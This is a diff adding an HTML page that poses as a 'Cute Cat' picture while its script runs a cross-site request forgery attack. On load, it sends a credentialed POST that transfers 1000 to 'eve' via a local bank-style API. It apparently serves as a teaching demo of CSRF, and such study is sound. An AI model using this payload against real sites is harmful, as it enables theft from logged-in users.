@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="">
+    <title>Cute Cat!!!</title>
+</head>
+
+<body>
+<h2>What a Cute Cat!!!</h2>
+
+<img src="cat.jpg"/>
+
+<script>
+    const to = "eve";
+    const amount = 1000;
+
+    const xmlhttp = new XMLHttpRequest();
+
+    xmlhttp.onreadystatechange = function () {
+        if (xmlhttp.readyState === XMLHttpRequest.DONE) {
+            if (xmlhttp.status === 200 || xmlhttp.status === 302) {
+                alert("Thank you!!! I just stole your money...");
+            } else if (xmlhttp.status === 0){
+                /*
+                    This might happen if the browser does not allow us to read the response
+                    of the request, although the request has gone through, and likely
+                    the transfer was made
+                 */
+                alert("Check your bank account... a 'nice' surprise is waiting for you!!!");
+            }else {
+                alert("Damn... I tried to steal your money but something went wrong");
+            }
+        }
+    };
+
+    /*
+        Note: in this case we don't really need encodeURIComponent(), because the
+        string "eve" has no special character that needs to be encoded.
+     */
+    const payload = "to=" + encodeURIComponent(to) + "&amount=" + amount;
+
+    xmlhttp.open("POST", "http://localhost:8080/api/transfers", true);
+    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    //by default, cookies would not be added in a cross-site request
+    xmlhttp.withCredentials = true;
+    xmlhttp.send(payload);
+</script>
+</body>
+
+</html>
+
